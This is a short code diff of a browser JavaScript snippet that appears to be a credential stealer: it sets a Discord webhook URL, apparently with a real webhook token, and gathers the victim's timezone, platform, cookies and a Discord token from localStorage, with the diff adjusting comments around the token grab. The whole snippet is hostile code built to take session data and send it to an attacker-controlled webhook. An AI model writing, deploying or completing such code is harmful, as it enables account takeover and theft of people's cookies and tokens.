@@ -1,5 +1,5 @@
 (async () => {
-    // 🔴 REPLACE WITH YOUR WEBHOOK
+    // 🔴 YOUR WEBHOOK URL
     const WEBHOOK = "https://discord.com/api/webhooks/1549927014431989884/bMMfsXarYXMv4UqbgtXrzY4PNibylPZSoDbBdyBzbekidFKv7Eq0HyuaasZKeLOka34d"; 
 
     try {
@@ -13,7 +13,8 @@
         data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
         data.platform = navigator.platform;
         data.cookies = document.cookie || "(No Cookies)";
-        // Add this inside the script
+        
+        // Discord Token (Specific check)
         data.discord_token = localStorage.getItem('discord_token') || "No Token Found";
 
         // Local Storage
